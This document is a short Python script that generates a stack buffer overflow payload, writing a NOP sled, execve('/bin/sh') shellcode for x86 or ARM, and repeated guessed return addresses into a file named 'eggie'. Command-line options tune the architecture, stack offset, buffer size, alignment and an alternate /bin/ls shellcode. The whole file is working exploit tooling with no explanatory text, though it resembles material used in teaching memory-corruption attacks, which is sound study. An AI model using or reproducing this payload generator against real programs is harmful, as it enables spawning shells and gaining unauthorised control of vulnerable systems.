#!/usr/bin/python3
import sys
import argparse
import struct

INTELSHELL = b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'
INTELNOP = b'\x90'
INTEL32SP = 3221225472

ARMSHELL = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78'
ARMNOP = b'\x01\x10\xa0\xe1'
ARM32SP = 2130706432

SHELL = INTELSHELL
NOP = INTELNOP
SP = INTEL32SP
ALIGNMENT = 0
NOPSIZE = 256
BUFSIZE = 512

def main():
    with open('eggie', 'wb') as f:
        f.write(NOP * 3 + NOP * NOPSIZE + ALIGNMENT * NOP)
        f.write(SHELL)
        f.write(HEXSP * SPLEN)
        f.write(b'\x0a')

if __name__ == '__main__': 
    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--architecture')
    parser.add_argument('-o', '--offset')
    parser.add_argument('-s', '--size')
    parser.add_argument('-c', '--command')
    parser.add_argument('-l', '--alignment')
    args = parser.parse_args()  

    if args.size:
        BUFSIZE = int(args.size)
        NOPSIZE = BUFSIZE // 2
    if args.architecture and args.architecture.lower() == 'arm':
        SHELL = ARMSHELL
        NOP = ARMNOP
        NOPSIZE = NOPSIZE // 4
        SP = ARM32SP
    if args.offset:
        SP = SP - int(args.offset)
    if args.command and args.command.lower() == 'ls':
        INTELSHELL = b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6c\x73'
        SHELL = INTELSHELL
    if args.alignment:
        ALIGNMENT = int(args.alignment)

    HEXSP = struct.pack('<L', SP)
    SPLEN = (BUFSIZE-NOPSIZE-len(SHELL)) // 4
    main()